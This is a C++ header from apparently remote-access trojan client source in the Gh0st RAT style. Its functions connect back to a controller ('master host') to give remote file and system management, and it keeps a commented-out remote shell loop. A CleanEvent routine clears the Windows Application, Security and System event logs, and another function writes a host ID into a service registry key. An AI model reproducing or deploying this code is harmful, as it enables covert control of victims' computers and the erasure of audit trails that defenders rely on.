#pragma once
#include "KernelManager.h"
#include "FileManager.h"

//#include "ShellManager.h"

#include "SystemManager.h"

#include "until.h"

#include <wininet.h>

extern bool g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;
	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();

	return 0;
}

// DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
// {
// 	CClientSocket	socketClient;
// 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
// 		return -1;
// 
// 	CShellManager	manager(&socketClient);
// 
// 	socketClient.run_event_loop();
// 
// 	return 0;
// }



DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	CClientSocket	socketClient;
	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
		return -1;

	CSystemManager	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}


void CleanEvent()
{
	//char *strEventName[] = {"Application", "Security", "System"};
	CString strEventName[3] = {_T("Application"), _T("Security"), _T("System")};
	for (int i = 0; i < 3 ; i++)
	{
		HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
		if (hHandle == NULL)
			continue;
		ClearEventLog(hHandle, NULL);
		CloseEventLog(hHandle);
	}
}

void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
// 	char	strSubKey[1024];
// 	memset(strSubKey, 0, sizeof(strSubKey));
// 	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
 	CString strSubKey;
	strSubKey.Format(_T("SYSTEM\\CurrentControlSet\\Services\\%s"), lpServiceName);
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("Host"), REG_SZ, (wchar_t*)lpHostID, lstrlen(lpHostID), 0);
}

